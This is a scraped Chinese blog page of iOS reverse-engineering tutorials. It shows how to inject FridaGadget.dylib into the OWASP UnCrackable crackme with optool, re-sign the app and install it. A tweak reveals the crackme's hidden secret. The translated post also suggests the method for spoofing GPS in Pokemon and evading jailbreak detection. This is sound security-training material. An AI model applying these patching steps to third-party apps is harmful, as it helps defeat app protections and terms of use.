"AQAAAABXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~";</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>已在Mac OS X EI Capitan 验证过</strong></p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>注1：</strong>  AES的CBC加密模式。即为密码分组链接模式（Cipher Block Chaining (CBC)），这种模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密。</p>
<p><strong>注2：</strong> Hmac算法，是密钥相关的哈希运算消息认证码，HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个消息摘要作为输出。</p>
<p><strong>注3：</strong> <a href="https://www.elcomsoft.com/eppb.html" target="_blank" rel="external">Elcomsoft Phone Breaker</a>是Elcomsoft公司的一款手机取证工具，具有解密、下载iCloud文件和备份，获取iCloud的Token，解析钥匙串等功能。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/06/30/iOS应用打补丁及重签名操作实战/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/30/iOS应用打补丁及重签名操作实战/" itemprop="url">iOS应用打补丁及重签名操作实战</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-30T08:39:51+08:00">
                2017-06-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="iOS-Apps打补丁及重签名实战操作笔记"><a href="#iOS-Apps打补丁及重签名实战操作笔记" class="headerlink" title="iOS Apps打补丁及重签名实战操作笔记"></a>iOS Apps打补丁及重签名实战操作笔记</h1><p><strong>原文：</strong> <a href="https://github.com/mail2chensh/OSG_Leaning/blob/master/Patching_and_ReSigning_iOS_Apps.md" target="_blank" rel="external">Patching and Re-Signing iOS Apps</a></p>
<p>以下笔记内容基于上面👆的翻译文章后的实战操作，没有阅读过原文的请先阅读一遍。</p>
<h2 id="工欲善其事必先利其器"><a href="#工欲善其事必先利其器" class="headerlink" title="工欲善其事必先利其器"></a>工欲善其事必先利其器</h2><h4 id="1-安装包及Frida动态库"><a href="#1-安装包及Frida动态库" class="headerlink" title="1. 安装包及Frida动态库"></a>1. 安装包及Frida动态库</h4><p>请先下载以下素材：</p>
<ul>
<li>App安装包：  <a href="https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/iOS/Level_01/UnCrackable_Level1.ipa" target="_blank" rel="external">UnCrackable_Level1.ipa</a></li>
<li>Frida动态库：<a href="https://build.frida.re/frida/ios/lib/FridaGadget.dylib" target="_blank" rel="external">FridaGadget.dylib</a></li>
</ul>
<h4 id="2-mobileprovision-文件"><a href="#2-mobileprovision-文件" class="headerlink" title="2. mobileprovision 文件"></a>2. mobileprovision 文件</h4><p>拥有开发者账号的，可以直接登录苹果开发者官网，然后新建一个App ID。</p>
<p>这里我创建的App ID是： <strong>com.osg.uncrack</strong></p>
<p>根据文章要求，进而创建一个provisioning文件： <strong>COM_OSG_UNCRACK.mobileprovision</strong></p>
<h4 id="3-创建-entitlements-plist文件"><a href="#3-创建-entitlements-plist文件" class="headerlink" title="3. 创建 entitlements.plist文件"></a>3. 创建 entitlements.plist文件</h4><p>创建一个权限文件，名为：<strong>entitlements.plist</strong>，然后填入一下内容注意需要将其中的标识符改为你自己的账号标识符。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>application-identifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>P683E34A2C.com.osg.uncrack<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>com.apple.developer.team-identifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>P683E34A2C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>get-task-allow<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">true</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">key</span>&gt;</span>keychain-access-groups<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>P683E34A2C.*<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="4-下载并生成optool工具"><a href="#4-下载并生成optool工具" class="headerlink" title="4. 下载并生成optool工具"></a>4. 下载并生成optool工具</h4><p>根据原文的操作，我们在github上面克隆optool的仓库，并更新子模块。</p>
<p><img src="https://ww1.sinaimg.cn/large/006tNbRwgy1fgjwrnkteyj30uw06otae.jpg" alt=""></p>
<p><img src="https://ww1.sinaimg.cn/large/006tNbRwgy1fgjwsvftckj31kw03wabr.jpg" alt=""></p>
<p>更新完毕后，我们用Xcode打开工程，运行一下，就会生成optool工具了。在工程目录下的Produce里面，右键选择<strong>Show in Finder</strong>，然后在打开的文件夹里面，将文件拷贝到目录<strong>/usr/bin/</strong>下。</p>
<p><img src="https://ww2.sinaimg.cn/large/006tNbRwgy1fgjwwzryj2j30jq0zyak4.jpg" alt=""></p>
<p>这样就可以在终端里面直接使用optool这个命令了。</p>
<p><img src="https://ww2.sinaimg.cn/large/006tNbRwgy1fgjwypdkr2j31ja0lwwj5.jpg" alt=""></p>
<h4 id="5-查询本地的证书"><a href="#5-查询本地的证书" class="headerlink" title="5. 查询本地的证书"></a>5. 查询本地的证书</h4><p>使用<strong>security</strong>命令查询本地钥匙串里面的证书。</p>
<p><img src="https://ww1.sinaimg.cn/large/006tNbRwgy1fgjx0d7gsaj31hk054q4m.jpg" alt=""></p>
<p>这里我们将要用到的是第二个，也就是developer开发环境下的证书。我们把唯一标识码记录下来，一会重签名的时候会用到。</p>
<h4 id="6-安装ios-depoy"><a href="#6-安装ios-depoy" class="headerlink" title="6. 安装ios-depoy"></a>6. 安装ios-depoy</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g ios-deploy</div></pre></td></tr></table></figure>
<h4 id="7-安装Frida"><a href="#7-安装Frida" class="headerlink" title="7. 安装Frida"></a>7. 安装Frida</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install frida</div></pre></td></tr></table></figure>
<p>到这里，基本上需要的东西都已经准备齐全了，我们新建一个文件夹<strong>resign</strong>，将上面所有的东西都放在一起，接下来就要开始打补丁和重签名了。</p>
<p><img src="https://ww2.sinaimg.cn/large/006tNbRwgy1fgjx3vv497j30rg07adhd.jpg" alt=""></p>
<h2 id="拆包清洗"><a href="#拆包清洗" class="headerlink" title="拆包清洗"></a>拆包清洗</h2><h4 id="1-将ipa包加压缩"><a href="#1-将ipa包加压缩" class="headerlink" title="1. 将ipa包加压缩"></a>1. 将ipa包加压缩</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unzip UnCrackable_Level1.ipa</div></pre></td></tr></table></figure>
<p>可以看到解压出一个Payload文件夹。</p>
<p><img src="https://ww3.sinaimg.cn/large/006tKfTcgy1fgjxawbhnjj311407omz4.jpg" alt=""></p>
<h4 id="2-拷贝动态库到资源包里面"><a href="#2-拷贝动态库到资源包里面" class="headerlink" title="2. 拷贝动态库到资源包里面"></a>2. 拷贝动态库到资源包里面</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> cp FridaGadget.dylib Payload/UnCrackable\ Level\ 1.app/</div></pre></td></tr></table></figure>
<p><img src="https://ww4.sinaimg.cn/large/006tKfTcgy1fgjxmtger6j313010c15o.jpg" alt=""></p>
<h4 id="3-额外加载动态库，使用optool插入加载命令到二进制文件"><a href="#3-额外加载动态库，使用optool插入加载命令到二进制文件" class="headerlink" title="3. 额外加载动态库，使用optool插入加载命令到二进制文件"></a>3. 额外加载动态库，使用optool插入加载命令到二进制文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> optool install -c load -p "@executable_path/FridaGadget.dylib" -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1</div></pre></td></tr></table></figure>
<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgjxomhgj6j31kw09bn04.jpg" alt=""></p>
<p>其中 <strong>-c</strong> 为指定 <strong>load_command</strong> 命令，<strong>-p</strong> 指定动态库的路径， <strong>-t</strong>指定目标文件。</p>
<h4 id="4-拷贝描述文件，并改名为embedded-mobileprovision"><a href="#4-拷贝描述文件，并改名为embedded-mobileprovision" class="headerlink" title="4. 拷贝描述文件，并改名为embedded.mobileprovision"></a>4. 拷贝描述文件，并改名为embedded.mobileprovision</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> cp COM_OSG_UNCRACK.mobileprovision Payload/UnCrackable\ Level\ 1.app/embedded.mobileprovision</div></pre></td></tr></table></figure>
<h4 id="5-将info-plist文件里面的包名更改为你自己的包名"><a href="#5-将info-plist文件里面的包名更改为你自己的包名" class="headerlink" title="5. 将info.plist文件里面的包名更改为你自己的包名"></a>5. 将info.plist文件里面的包名更改为你自己的包名</h4><p><img src="https://ww4.sinaimg.cn/large/006tKfTcgy1fgjxs4z6ckj30tq0y87cn.jpg" alt=""></p>
<h4 id="6-使用codesign来进行代码签名"><a href="#6-使用codesign来进行代码签名" class="headerlink" title="6. 使用codesign来进行代码签名"></a>6. 使用codesign来进行代码签名</h4><p><img src="https://ww3.sinaimg.cn/large/006tKfTcgy1fgjxtd3i1gj31kw0cf0x1.jpg" alt=""></p>
<h2 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h2><p>到这里基本上打补丁和重签名就完成了，接下来可以使用ios-deploy这个工具来安装应用到手机，也可以直接重新压缩为zip格式并改为ipa后缀来安装。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> ios-deploy --debug --bundle Payload/UnCrackable\ Level\ 1.app/</div></pre></td></tr></table></figure>
<p>可以看到启动成功，并安装到手机上面，而且还进入lldb的调试模式：</p>
<p><img src="https://ww3.sinaimg.cn/large/006tKfTcgy1fgjxhgrv55j31kw097tef.jpg" alt=""></p>
<p>另外，我们可以看到终端打印出来Frida已经运行，并且开启了监听端口。</p>
<p><img src="https://ww2.sinaimg.cn/large/006tNbRwgy1fgkemkfitgj31ak01o3z7.jpg" alt=""></p>
<p>接下来我们来验证一下我们的frida是否成功插入app里面。</p>
<p>运行下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> frida-ps -U</div></pre></td></tr></table></figure>
<p>可以看到对应的Server：</p>
<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgjxjm8zv5j30bw04kq34.jpg" alt=""></p>
<p>至此，我们的重签名步骤也全部完成了。✌️</p>
<h2 id="打开新世界大门"><a href="#打开新世界大门" class="headerlink" title="打开新世界大门"></a>打开新世界大门</h2><p>然而，当我们结束了以上的操作步骤，我们会觉得有点点的小空虚，甚至有点茫然？？？exm？就这样结束了？好像没有多大的意思，没有感受到一点点打补丁的快感。</p>
<p>我们将本文实验的UnCrackable app安装到手机后，打开的界面是这样的：</p>
<p><img src="https://ww2.sinaimg.cn/large/006tKfTcgy1fgps0g2diwj31340rw40c.jpg" alt=""></p>
<p>一个非常简洁的界面，这里告诉了我们有一个秘密藏在了一个隐藏的Label，你想要通关，就要找出那个label。将label的内容填入输入框内，点击按钮就可以进行验证密文是否正确。</p>
<p>现在我们的扩展任务就是将密文找出来破解掉。</p>
<p>这里的笔者的简单思路是这样的：既然有一个隐藏的label在这个界面上，那么只要遍历这个界面的子视图，判断是否为label类，并且判断是否为隐藏属性，如果都符合，那应该就是我们要找的通过密文了。</p>
<p>我们可以写一个小小的Tweak，来实现我们的思路。</p>
<p>Tweak内容如下： </p>
<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgprs06ck5j31180ymte1.jpg" alt=""></p>
<p>这里可能有朋友会问，我怎么知道该hook哪个类呢？这里有很多种方法，例如可以dump应用的头文件，也可以使用Hopper来查看反汇编的代码，都可以很容易的找到这个界面类，当然，我们上面安装的ios-deploy工具和Frida都可以完成这个功能，这里就不一一展开。</p>
<p>这里我们将这个Tweak文件编译打包成dylib文件，这里我已经提供好了，看官可以在这里下载：</p>
<p>补丁包下载地址：  <a href="http://7xiunj.com1.z0.glb.clouddn.com/uncracktw.dylib" target="_blank" rel="external">UncrackTw.dylib</a></p>
<p>之后会有专题专门介绍如何编写Tweak生成dylib文件的，这里先不展开叙述。</p>
<p>这样一来，我们就可以重复上面我们的操作了，将我们下载的  <strong>UncrackTw.dylib</strong>文件作为补丁插入到app里面，然后进行重签名，安装到我们的机子后，我们看看出来的效果界面是这样的：</p>
<p>我们可以看到，这里我们的补丁已经将这个界面隐藏的label找出来，并且将它的属性修改为可见，还把密文自动填入输入框中：</p>
<p><img src="https://ww3.sinaimg.cn/large/006tKfTcgy1fgpsdjmdczj30lo0gsgms.jpg" alt=""></p>
<p>我们可以点击Verify按钮来验证密文是否正确： </p>
<p><img src="https://ww2.sinaimg.cn/large/006tKfTcgy1fgpsfbr9ifj30le0p6jsr.jpg" alt=""></p>
<p>可以看到，我们找到了正确的密文。至此，我们也算是正式的体验了一把小小的hack。</p>
<p>接下来就开启了一个新世界，怎么玩就看少年你了！！</p>
<p><img src="https://ww1.sinaimg.cn/large/006tKfTcgy1fgpsk3r7b3j308c08c3ys.jpg" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://chensh.top/2017/06/30/Patching-and-ReSigning-iOS-Apps/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Chensh">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Forest Mist">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/30/Patching-and-ReSigning-iOS-Apps/" itemprop="url">Patching and Re-Signing iOS Apps</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-30T08:26:23+08:00">
                2017-06-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="对iOS-Apps打补丁以及重签名"><a href="#对iOS-Apps打补丁以及重签名" class="headerlink" title="对iOS Apps打补丁以及重签名"></a>对iOS Apps打补丁以及重签名</h2><h5 id="原著地址：Patching-and-Re-Signing-iOS-Apps"><a href="#原著地址：Patching-and-Re-Signing-iOS-Apps" class="headerlink" title="原著地址：Patching and Re-Signing iOS Apps"></a>原著地址：<a href="http://www.vantagepoint.sg/blog/85-patching-and-re-signing-ios-apps" target="_blank" rel="external">Patching and Re-Signing iOS Apps</a></h5><h5 id="作者：-Bernhard-Mueller"><a href="#作者：-Bernhard-Mueller" class="headerlink" title="作者： Bernhard Mueller"></a>作者： Bernhard Mueller</h5><h5 id="翻译：-Chensh"><a href="#翻译：-Chensh" class="headerlink" title="翻译： Chensh"></a>翻译： Chensh</h5><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在没有越狱的设备上运行经过修改的iOS二进制文件，听起来是一个不错的主意，特别是当你的越狱机子变砖后，你想把机子更新为非越狱的iOS版本的时候（尽管我和我身边的人重来没遇到过这种事情）。</p>
<p>你可以使用这种技术对app进行动态分析，假如你在非洲，你可以做一个虚假的GPS定位来欺骗锁区的Pokemon，又不想被越狱检测。不管如何，你可以跟着下面的教程来修改一个app并且重签，然后让它运行在你未越狱的设备上。注意这里的技术实现的前提条件是需要先砸壳，特别是来自App Store的App。</p>
<p>由于苹果有代码签名系统和配置描述的规定，使得重签一个app不是一项简单的挑战。如果一个app的配置描述文件和代码签名头部不完全一致，则会被iOS系统拒绝运行。这就要求你需要学习许多相关的概念——证书、包名、应用ID、团队标识符以及如何使用苹果的构建工具将他们绑定在一起。完全可以说，不使用Xcode这种默认方式去构建一个系统可以运行的特定的二进制文件，是一个巨大的挑战。</p>
<p>我们将要使用的工具包括<a href="https://github.com/alexzielenski/optool" target="_blank" rel="external">optool</a>,苹果的构建工具以及一些Shell命令。这个方法中的重签脚本灵感来源于 <a href="https://github.com/vtky/Swizzler2/wiki" target="_blank" rel="external">Vincent Tan’s Swizzler project</a>。另外的重打包来源于<a href="https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/" target="_blank" rel="external">NCC group</a>。</p>
<p>要复现以下步骤，请先下载一个app:<a href="https://github.com/OWASP/owasp-mstg/blob/master/Crackmes/iOS/Level_01/UnCrackable_Level1.ipa" target="_blank" rel="external">UnCrackable iOS App Level 1</a>,来自OWASP移动测试指南的分支。我们的目标是使得 UnCrackable 这个app在启动的时候加载 FridaGadget.dylib 这个动态库，这样我们就能使用Frida来进行分析。</p>
<h2 id="获取一份开发者配置文件和证书"><a href="#获取一份开发者配置文件和证书" class="headerlink" title="获取一份开发者配置文件和证书"></a>获取一份开发者配置文件和证书</h2><p>配置文件是由你的一个或多个设备上的代码签名证书集成的一份plist格式的文件，由苹果进行白名单签名验证。就是说，苹果明确的要求你的应用运行在某一特性的环境里，例如在选定的设备上进行调试。配置文件也列出了你的应用拥有的权限，而代码签名证书里面包含了将要用于真实签名的私钥。</p>
<p>根据你是否已经注册为iOS开发者，你可以选择一下两种方式之一去获取证书和配置文件。</p>
<h4 id="使用iOS开发者账号："><a href="#使用iOS开发者账号：" class="headerlink" title="使用iOS开发者账号："></a>使用iOS开发者账号：</h4><p>如果你之前曾使用Xcode开发和部署过iOS应用，那么你已经拥有了一个代码签名证书。使用<strong>security</strong>工具可以列出你当前存在的签名标志：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> security find-identity -p codesigning -v</div><div class="line">1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "iPhone Distribution: Vantage Point Security Pte. Ltd."</div><div class="line">2) 8004380F331DCA22CC1B47FB1A805890AE41C938 "iPhone Developer: Bernhard Müller (RV852WND79)"</div></pre></td></tr></table></figure>
<p>注册开发者账号能够从苹果开发者网站获取到配置文件，这里有份指南，可以指导第一次创建相应的证书和配置文件，<a href="https://developer.apple.com/library/content/documentation/IDEs/Conceptual/AppDistributionGuide/MaintainingProfiles/MaintainingProfiles.html" target="_blank" rel="external">戳这里</a>。对于重打包来说，并不特定要求你选择了什么应用ID，你甚至可以重用一个已经存在的ID。最重要的事情是拥有一份匹配的配置文件。确保你创建了一份开发环境的配置文件，而不是一份发布描述文件，这样你才能对app进行调试。</p>
<p>在以下的shell命令列表中，我将会使用我公司的开发团队关联的个人签名身份。并创建了一个应用id为”sg.vp.repackaged”,以及一将配置文件取名为”AwesomeRepackaging”，这样生成出来的配置文件就是”AwesomeRepacaging.mobileprovision”——这里需要更换成你自己的id名和配置文件名。</p>
<h4 id="使用常规的iTunes账号："><a href="#使用常规的iTunes账号：" class="headerlink" title="使用常规的iTunes账号："></a>使用常规的iTunes账号：</h4><p>虽然你不是一个付费开发者，但苹果还是提供了一个免费的开发者配置文件。你可以在Xcode里面使用你的Apple账号获取这个配置文件，只需简单的编译一个空的iOS工程，然后从app资源包里面提取出这个<strong>embedded.mobileprovision</strong>，具体可以参考<a href="https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/" target="_blank" rel="external">NCC blog</a>的这篇博文。</p>
<p>当你获取到这个配置文件后，你可以使用<strong>security</strong>这个工具来查看它的内容。除了许可证书以及设备外，你还能在这个描述文件找到app的权限授权表。在之后的代码签名里面，你需要这个表，所以下面将演示如何将他们提取出来到一个plist格式的文件里。也可以看看文件的内容，看看是否如预期般。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> security cms -D -i AwesomeRepackaging.mobileprovision &gt; profile.plist</div><div class="line"><span class="meta">$</span> /usr/libexec/PlistBuddy -x -c 'Print :Entitlements' profile.plist &gt; entitlements.plist</div><div class="line"><span class="meta">$</span> cat entitlements.plist</div><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</div><div class="line">&lt;plist version="1.0"&gt;</div><div class="line">&lt;dict&gt;</div><div class="line">&lt;key&gt;application-identifier&lt;/key&gt;</div><div class="line">&lt;string&gt;LRUD9L355Y.sg.vantagepoint.repackage&lt;/string&gt;</div><div class="line">&lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;</div><div class="line">&lt;string&gt;LRUD9L355Y&lt;/string&gt;</div><div class="line">&lt;key&gt;get-task-allow&lt;/key&gt;</div><div class="line">&lt;true/&gt;</div><div class="line">&lt;key&gt;keychain-access-groups&lt;/key&gt;</div><div class="line">&lt;array&gt;</div><div class="line">&lt;string&gt;LRUD9L355Y.*&lt;/string&gt;</div><div class="line">&lt;/array&gt;</div><div class="line">&lt;/dict&gt;</div><div class="line">&lt;/plist&gt;</div></pre></td></tr></table></figure>
<p>注意到我们的App ID是由团队标识符（LRUD9L355Y）以及包名(sg.vantagepoint.repackage)组合而成的。这个配置文件只对携带这样特定的app id才有效。“get-task-allow”这个键非常重要，当它为true时，像debugging server这样的其他进程才能够附加到这个app。可想而知，在发布描述文件里面，这个键的值肯定是false的。</p>
<h4 id="其他准备工作"><a href="#其他准备工作" class="headerlink" title="其他准备工作"></a>其他准备工作</h4><p>为了在我们的app启动的时候加载一个附加的库，我们需要插入一条额外的加载命令到主程序的Mach-O头中。这里我们使用<a href="https://github.com/alexzielenski/optool" target="_blank" rel="external">optool</a>工具来自动化这个工程：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> git clone https://github.com/alexzielenski/optool.git</div><div class="line"><span class="meta">$</span> cd optool/</div><div class="line"><span class="meta">$</span> git submodule update --init --recursive</div></pre></td></tr></table></figure>
<p>我们也将使用到<a href="https://github.com/phonegap/ios-deploy" target="_blank" rel="external">ios-deploy</a>这个工具，这个工具能够在不使用Xcode的情况下发布或者调试iOS。（npm是Nodejs的包管理器，如果你还没有安装<a href="https://nodejs.org/en/" target="_blank" rel="external">Nodejs</a>，你可以使用homebrew来安装，或者到官网直接下载安装包）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> npm install -g ios-deploy</div></pre></td></tr></table></figure>
<p>另外，在教程开始前，你还需要先把 FridaGadget.dylib 这个动态库下载下来。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> curl -O https://build.frida.re/frida/ios/lib/FridaGadget.dylib</div></pre></td></tr></table></figure>
<p>除了以上提到的工具，我们还需要使用一些原生系统工具和Xcode的编译工具，所以确保你已经安装了Xcode命令行开发工具。</p>
<h4 id="打补丁，重打包以及重签名"><a href="#打补丁，重打包以及重签名" class="headerlink" title="打补丁，重打包以及重签名"></a>打补丁，重打包以及重签名</h4><p>来不及了，快上车吧！</p>
<p>如你所知，IPA文件其实一种ZIP压缩格式，所以我们可以使用zip工具来解压缩。然后将<strong>FridaGadget.dylib</strong>拷贝到文件目录下。并且使用<strong>optool</strong>工具将一条加载命令插入到<strong>UnCrackable Level 1</strong>这个二进制文件内。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> unzip UnCrackable_Level1.ipa</div><div class="line"><span class="meta">$</span> cp FridaGadget.dylib Payload/UnCrackable\ Level\ 1.app/</div><div class="line"><span class="meta">$</span> optool install -c load -p "@executable_path/FridaGadget.dylib" -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1</div><div class="line">Found FAT Header</div><div class="line">Found thin header...</div><div class="line">Found thin header...</div><div class="line">Inserting a LC_LOAD_DYLIB command for architecture: arm</div><div class="line">Successfully inserted a LC_LOAD_DYLIB command for arm</div><div class="line">Inserting a LC_LOAD_DYLIB command for architecture: arm64</div><div class="line">Successfully inserted a LC_LOAD_DYLIB command for arm64</div><div class="line">Writing executable to Payload/UnCrackable Level 1.app/UnCrackable Level 1...</div></pre></td></tr></table></figure>
<p>这种对主程序明显的篡改将会使得它的代码签名失效。所以这个无法再非越狱机子上面运行。所以你将需要替换掉配置文件，并使用描述文件中列举的证书对主程序和FridaGadget.dylib进行重新签名。</p>
<p>第一步，将我们的自己的配置文件拷贝到资源包里面：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> cp AwesomeRepackaging.mobileprovision Payload/UnCrackable\ Level\ 1.app/embedded.mobileprovision\</div></pre></td></tr></table></figure>
<p>第二步，我们需要确保在<strong>Info.plist</strong>中的包名是否跟我们的描述文件里面指定的一致。因为在重签的过程中，<strong>codesign</strong>会检查我们的Info.plist文件里面的包名，如果不匹配则会返回一个错误值。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> /usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier sg.vantagepoint.repackage" Payload/UnCrackable\ Level\ 1.app/Info.plist</div></pre></td></tr></table></figure>
<p>最后，我们需要使用代码签名工具来重签所有的二进制文件：</p>
